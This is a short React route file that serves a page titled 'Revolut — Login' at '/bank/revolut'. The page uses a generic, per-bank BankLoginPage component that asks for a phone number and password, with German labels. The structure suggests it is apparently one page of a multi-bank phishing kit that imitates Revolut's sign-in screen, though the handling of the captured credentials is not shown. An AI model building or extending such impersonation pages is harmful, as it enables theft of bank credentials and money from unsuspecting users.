import { createFileRoute } from "@tanstack/react-router";
import { BankLoginPage } from "@/components/BankLoginPage";

export const Route = createFileRoute("/bank/revolut")({
  head: () => ({ meta: [{ title: "Revolut — Login" }] }),
  component: () => (
    <BankLoginPage idPrefix="revolut" logoSlug="revolut" title="Revolut" field1Label="Telefonnummer" field2Label="Passwort" />
  ),
});
